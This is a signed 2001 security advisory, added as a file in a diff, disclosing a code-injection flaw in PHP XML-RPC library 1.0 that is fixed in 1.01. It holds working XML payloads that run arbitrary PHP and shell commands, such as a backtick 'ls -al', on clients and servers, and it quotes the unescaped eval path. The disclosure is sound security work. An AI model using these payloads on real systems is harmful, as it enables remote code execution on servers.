@@ -1,0 +1,174 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+
+I received this advisory from Dan Libby <dan@libby.com>. With his
+permission it is reproduced here.  Note that this exploit is fixed
+in revisions 1.01 and greater of XML-RPC for PHP.
+
+- -- Edd Dumbill
+
+
+Tue Sep 24 2001
+===============
+
+PHP Security Hole: potential XML-RPC exploit
+============================================
+
+Abstract:
+
+Using the latest release of Useful Inc's php xmlrpc library, version 1.0, 
+it is possible for an attacker to structure the xml in such a way as to 
+trick the xml-rpc library into executing php code on a web server.  I 
+was able to execute arbitrary php code, and with php's safe-mode turned 
+off, system commands.  An attacker could easily use this as a gateway for 
+launching viruses.  
+
+Details:
+
+I demonstrated the problem by modifying the server.php example script 
+included with the xmlrpc distribution and then calling it via the 
+client.php script, also part of the distribution. I bypassed the standard
+server code, and simply echo'd responses back to the the client. I was 
+able to get the client to execute arbitrary php code. I then restored the
+server.php sample to its original state and used telnet to send a modified
+request. I was also able to make code execute on the server, albeit requiring
+a slightly differnt syntax.
+
+The attack centers around use of php's eval() function. Since I knew that 
+the xml-rpc library uses eval to construct its data structures from xml 
+input, it was just a matter of structuring the input xml in such a 
+manner that it:
+
+a) is not escaped before being passed to eval
+b) does not generate a php syntax error
+
+Normally, all non numeric data is escaped by the library before being 
+passed to eval.  However, it turns out that if you send a <value> tag, 
+followed by an unexpected tag, such as <foo>, the escaping code will be 
+bypassed and "raw" data will be evaluated instead.  
+
+Exploiting the client:
+
+Here is a typical xml-rpc response:
+
+<?xml version="1.0"?>
+<methodResponse>
+<params><param>
+
+<value><string>hello world</string></value>
+
+</param></params>
+</methodResponse>
+
+When such a response is eval'ed, it looks like:
+
+new xmlrpcval("hello world", "string")
+
+
+Here is an xml-rpc response that will execute php code to echo "<h1> hello 
+world </h1>" on the client side:
+
+<?xml version="1.0"?>
+<methodResponse>
+<params><param>
+
+<value><foo>", "string"); echo "&lt;h1> hello world &lt;/h1>"; \$waste = array("</foo></value>
+
+</param></params>
+</methodResponse>
+
+
+In this case, the string that will be eval'ed is:
+
+new xmlrpcval("", "string"); echo "<h1> hello world </h1>"; $waste = array("", 'string')
+
+
+
+It is possible to replace everything between "string"); and \$waste with 
+arbitrary code of just about any length.
+
+Finally, here's one that will print the contents of the current directory:
+
+<?xml version="1.0"?>
+<methodResponse>
+<params>
+<param>
+<value><foo>&#34;, "string");
+
+echo "&lt;h1>&lt;font color=red>if you see a directory listing, I just executed php and system code via xml-rpc.&lt;/font>&lt;/h1>"; 
+echo "now I will attempt a directory listing using ls -al:\n&lt;xmp>"; echo `ls -al`; echo "&lt;/xmp>";
+echo "I could just have easily invoked rm -rf, or written a program to disk and executed it (eg, a virus) or read some files. Have a nice day.&lt;br>&lt;br>";
+exit;
+
+\$waste = array("</foo></value>
+</param>
+</params>
+</methodResponse>
+
+Exploiting the server:
+
+The server exploit is just about the same as the client, except that the 
+server is using a different eval command, and thus it requires slightly 
+different begin and ending syntax to avoid php syntax errors.
+
+Here is the same code as above, but it will work against a server.
+
+<?xml version='1.0' encoding="iso-8859-1" ?> 
+<methodCall> 
+<methodName>system.listMethods</methodName> 
+<params>
+<param>
+<value><test>&#34;, "string"));
+
+echo "&lt;h1>&lt;font color=red>if you see a directory listing, I just executed php and system code via xml-rpc.&lt;/font>&lt;/h1>"; 
+echo "now I will attempt a directory listing using ls -al:\n&lt;xmp>"; echo `ls -al`; echo "&lt;/xmp>";
+
+echo "I could just have easily invoked rm -rf, or written a program to disk and executed it (eg, a virus) or read some files. Have a nice day.&lt;br>&lt;br>";
+exit;
+
+$waste = array(array("</test></value>
+</param>
+</params>
+</methodCall>
+
+
+Problem Area:
+
+in xmlrpc.inc, there is a function called xmlrpc_cd(), which is called by 
+the xml parser to handle character data.
+
+function xmlrpc_cd($parser, $data) {
+   global $_xh, $xmlrpc_backslash, $xmlrpc_twoslash;
+
+//if (ereg("^[\n\r \t]+$", $data)) return;
+// print "adding [${data}]\n";
+   if ($_xh[$parser]['lv']==1) {
+      $_xh[$parser]['qt']=1; 
+      $_xh[$parser]['lv']=2; 
+   }
+   if ($_xh[$parser]['qt']) { // quoted string
+      $_xh[$parser]['ac'].=str_replace('\$', '\\$',
+                                       str_replace('"', '\"', 
+                                                   str_replace(chr(92),$xmlrpc_backslash, $data)));
+   }
+   else
+      $_xh[$parser]['ac'].=$data;
+}
+
+It is the last else that is causing data to be added without escaping.  It 
+is very dangerous to have this.  This else seems to be intended for 
+numeric data, and great pains are taken to set and unset the "qt" (quote) 
+variable which turns escaping on and off. However, it is not immediately 
+apparent to me why numeric data should not be similarly escaped, and the
+if/else removed, such that there is zero chance for this type of exploit.
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.6 (GNU/Linux)
+Comment: For info see http://www.gnupg.org
+
+iEYEARECAAYFAjuw0KUACgkQrxbtsbubhxHWLQCfbopRtz9TLDLkw6zpA5KP8Swx
+QosAoOMSCVsZCUNk1gGFWdgS4jJ5PxBt
+=441W
+-----END PGP SIGNATURE-----
